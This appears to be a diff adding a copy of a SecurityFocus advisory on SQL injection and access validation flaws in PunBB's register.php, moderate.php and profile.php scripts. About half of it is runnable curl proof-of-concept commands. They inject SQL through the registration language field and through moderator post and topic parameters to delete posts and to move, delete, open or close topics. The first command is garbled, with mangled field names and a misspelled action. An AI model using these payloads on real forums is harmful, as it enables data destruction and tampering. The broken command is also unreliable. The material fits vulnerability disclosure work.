@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/12652/info
+
+Multiple remote input validation vulnerabilities affect PunBB. These issues are due to a failure of the application to sanitize user-supplied input prior to using it to carry out critical functions.
+
+The first issue is an SQL injection issue in the 'register.php' script. The second issue is an SQL injection issue in the 'moderate.php' script. A third SQL injection issue exists in the 'profile.php' script. Finally an access validation issue affects the 'profile.php' script.
+
+An attacker may leverage these issues to have arbitrary SQL queries executed against the database; this may facilitate data corruption or manipulation. Furthermore one of these issues may be leveraged to trigger a denial of service condition against current user by setting their passwords to a NULL value.
+
+This example demonstrates the SQL injection vulnerability in the language parameter:
+
+curl --form form_sent=1 --form req_username=sha --form req_password1=passwd --form req_paspasswd --form req_email1=sha@punbb.com --form
+language="English', 'Oxygen', 0, '0.0.0.0', 0) -- " http://target/register.php?action=registerer
+
+Attacks delete posts:
+curl --referer http://www.example.com/moderate.php --form posts="0) -- this won't show" --form delete_posts_comply=1 --cookie punbb_cookie=<valid
+cookie> target/moderate.php?fid=1\&tid=1
+
+Attacks move topics:
+curl --referer http://www.example.com/moderate.php --form topics="2) -- this won't show" --form move_to_forum=2 --form move_topics=1 --form
+move_topics_to=1 --cookie punbb_cookie=<valid cookie> target/moderate.php?fid=1
+
+Attacks delete topics:
+curl --referer http://www.example.com/moderate.php --form topics="2) -- this won't show" --form delete_topics=1 --form delete_topics_comply=1
+--cookie punbb_cookie=<valid cookie> target/moderate.php?fid=1
+
+Attacks open/close:
+curl --referer http://www.example.com/moderate.php --form "topics[0) -- this won't show]"= --form open=1 --cookie "punbb_cookie=<valid cookie>
+target/moderate.php?fid=1
+
